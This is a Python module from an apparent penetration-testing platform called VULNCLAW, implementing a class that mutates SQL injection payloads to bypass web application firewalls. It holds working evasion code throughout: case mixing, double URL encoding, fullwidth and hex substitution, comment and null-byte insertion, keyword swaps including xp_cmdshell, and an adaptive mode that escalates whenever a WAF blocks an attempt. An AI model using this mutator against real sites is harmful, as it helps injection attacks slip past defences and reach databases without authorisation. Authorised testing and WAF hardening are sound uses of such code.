# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""Payload 智能变异器 - VULNCLAW v100

基于 WAF 反馈智能变异 Payload，用于绕过 WAF。
"""
import random
import re
import urllib.parse
from typing import List, Optional

from vulnclaw.core.logger import logger

_SQL_KEYWORDS = [
    "SELECT", "UNION", "OR", "AND", "FROM", "WHERE",
    "ORDER", "GROUP", "BY", "HAVING", "LIMIT", "INSERT",
    "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "EXEC",
    "EXECUTE", "WAITFOR", "SLEEP", "BENCHMARK",
]

_SQL_EQUIVALENTS = {
    "OR":   ["||", "OR", "or", "oR", "Or", "/*OR*/", "/*!OR*/"],
    "AND":  ["&&", "AND", "and", "AnD", "aNd", "/*AND*/", "/*!AND*/"],
    "UNION":["UNION", "union", "UnIoN", "uNiOn", "UNION/**/", "UNION%0a"],
    "SELECT":["SELECT", "select", "SeLeCt", "sElEcT"],
    "FROM": ["FROM", "from", "FrOm", "fRoM"],
    "WHERE":["WHERE", "where", "WhErE", "wHeRe"],
    "SLEEP":["SLEEP", "sleep", "BENCHMARK", "WAITFOR DELAY"],
    "EXEC": ["EXEC", "exec", "xp_cmdshell", "sp_executesql"],
}

_SQL_COMMENTS = ["--", "#", "/*", "/*!", "/*!*/"]


class PayloadMutator:
    """Payload 智能变异器。

    使用方式::

        from vulnclaw.core.payload_mutator import PayloadMutator
        mutator = PayloadMutator()
        variants = mutator.mutate_combine("1' OR '1'='1", level=3)
    """

    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)

    def mutate_case(self, payload: str) -> List[str]:
        """大小写混淆：全大写/全小写/随机大小写。"""
        if not payload:
            return []
        variants: set = {payload.upper(), payload.lower(), payload.swapcase()}
        rand = random.random
        chars = []
        for c in payload:
            if c.isalpha() and rand() > 0.4:
                chars.append(c.upper() if rand() > 0.5 else c.lower())
            else:
                chars.append(c)
        variants.add("".join(chars))
        return [v for v in variants if v != payload]

    def mutate_encoding(self, payload: str) -> List[str]:
        """URL 编码 / 双重编码 / Unicode 全角 / Hex 编码。"""
        if not payload:
            return []
        variants: set = set()
        try:
            enc1 = urllib.parse.quote(payload, safe="")
            if enc1 != payload:
                variants.add(enc1)
            enc2 = urllib.parse.quote(enc1, safe="")
            if enc2 != enc1:
                variants.add(enc2)
        except (TypeError, ValueError, urllib.parse.URLError) as exc:
            logger.debug("encode 失败: %s", exc)
        except Exception as exc:
            logger.warning("encode 未知异常: %s", exc)

        variants.add(payload.replace(" ", "\u00a0"))
        variants.add(payload.replace(" ", "\u3000"))
        for half, full in [("'", "\uff07"), ('"', "\uff02"), ("=", "\uff1d")]:
            if half in payload:
                variants.add(payload.replace(half, full))
        hex_chars = []
        for c in payload:
            if ord(c) < 128 and not c.isalnum() and c != " ":
                hex_chars.append(f"%{ord(c):02X}")
            else:
                hex_chars.append(c)
        variants.add("".join(hex_chars))
        return [v for v in variants if v and v != payload]

    def mutate_comment(self, payload: str) -> List[str]:
        """在 SQL 关键字或空格位置插入注释。"""
        if not payload:
            return []
        variants: set = set()
        for kw in _SQL_KEYWORDS:
            if kw in payload.upper():
                for comment in _SQL_COMMENTS:
                    close = "*/" if comment.startswith("/*") else ""
                    variant = re.sub(
                        kw, kw + comment + close,
                        payload, count=1, flags=re.IGNORECASE,
                    )
                    if variant != payload:
                        variants.add(variant)
                break
        for comment in _SQL_COMMENTS:
            if " " in payload:
                close = "*/" if comment.startswith("/*") else ""
                variant = payload.replace(" ", comment + close, 1)
                if variant != payload:
                    variants.add(variant)
        return [v for v in variants if v and v != payload]

    def mutate_whitespace(self, payload: str) -> List[str]:
        """用各种空白/控制字符替换空格或插入字符间。"""
        if not payload:
            return []
        variants: set = set()
        for ws in ["%0a", "%0d", "%09", "%00", "/**/", "/*!*/"]:
            variant = payload.replace(" ", ws)
            if variant and variant != payload:
                variants.add(variant)
        if len(payload) > 1:
            variants.add("%00".join(list(payload)))
        return [v for v in variants if v and v != payload]

    def mutate_sql_keywords(self, payload: str) -> List[str]:
        """SQL 关键字等价替换与拆分。"""
        if not payload:
            return []
        variants: set = set()
        upper = payload.upper()
        for kw, alts in _SQL_EQUIVALENTS.items():
            if kw not in upper:
                continue
            sample = random.sample(alts, min(2, len(alts)))
            for alt in sample:
                variant = re.sub(kw, alt, payload, count=1, flags=re.IGNORECASE)
                if variant and variant != payload:
                    variants.add(variant)
        if re.search(r"\bOR\b", payload, re.IGNORECASE):
            v = re.sub(r"\bOR\b", "||", payload, flags=re.IGNORECASE)
            if v != payload:
                variants.add(v)
        if re.search(r"\bAND\b", payload, re.IGNORECASE):
            v = re.sub(r"\bAND\b", "&&", payload, flags=re.IGNORECASE)
            if v != payload:
                variants.add(v)
        if "'" in payload:
            variants.add(payload.replace("'", '"'))
        return [v for v in variants if v and v != payload]

    def mutate_combine(self, payload: str, level: int = 2) -> List[str]:
        """组合多种变异策略。

        level 1:  大小写 + 注释
        level 2:  + 编码 + 空白
        level 3:  + SQL 关键字混淆
        """
        if not payload:
            return []
        variants: List[str] = [payload]
        variants.extend(self.mutate_case(payload))
        variants.extend(self.mutate_comment(payload))
        if level >= 2:
            variants.extend(self.mutate_encoding(payload))
            variants.extend(self.mutate_whitespace(payload))
        if level >= 3:
            variants.extend(self.mutate_sql_keywords(payload))
        seen: set = set()
        result: List[str] = []
        for v in variants:
            if v and v != payload and v not in seen:
                seen.add(v)
                result.append(v)
        logger.debug("mutate_combine: %d variants (level=%d)", len(result), level)
        return result

    def mutate_waf_adaptive(
        self,
        payload: str,
        waf_detected: bool,
        attempt: int = 0,
        max_level: int = 5,
    ) -> List[str]:
        """根据 WAF 检测反馈自适应调整变异强度。"""
        if not waf_detected:
            return [payload]
        level = min(max_level, 1 + max(0, attempt))
        logger.info("WAF 自适应变异: attempt=%d level=%d", attempt, level)
        return self.mutate_combine(payload, level=level)